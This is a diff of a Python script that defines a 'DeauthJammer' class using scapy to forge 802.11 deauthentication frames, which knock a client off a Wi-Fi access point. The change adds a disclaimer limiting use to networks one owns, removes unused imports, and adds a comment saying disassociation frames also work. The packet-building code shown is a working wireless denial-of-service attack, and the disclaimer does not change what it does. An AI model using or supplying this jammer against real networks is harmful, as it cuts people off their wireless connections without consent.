@@ -1,7 +1,8 @@
 #! /usr/bin/env python
 
-# We might just use this?
-# https://gist.githubusercontent.com/raw/4576966/4591a64fcad42fe8aff239e3319e5949fef95d59/sniff-aps-complete.py
+# Use this only against networks you own and clients you are elligible to kick off the network.
+# Never use this tool against foreign networks without permission.
+# The authors of this script do not encourage you to do this at all.
 
 import threading
 import atexit
@@ -9,8 +10,6 @@ import argparse
 import types
 import os
 import subprocess
-import signal
-import sys
 import time
 
 import scapy.all as scapy
@@ -25,7 +24,6 @@ class DeauthJammer(object):
         self._thread_event.set()
         self._thread_lock = threading.Lock()
 
-        # scapy.conf.iface =
         atexit.register(self._on_end)
         scapy.conf.iface = iface
         scapy.conf.verb = 0  # Non-verbose mode
@@ -91,7 +89,7 @@ class DeauthJammer(object):
             self._on_end()
 
     def _deauth_target(self, target, packet_count):
-        broadcast = target.lower() != 'FF:FF:FF:FF:FF:FF'
+        # This also works with subtype 10, "Disassociation-Frame", verified with MBP running 10.12.4
         ap_to_client_pckt = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=target, addr2=self._ap_bssid,
                                                            addr3=self._ap_bssid) / scapy.Dot11Deauth(reason=1)
 
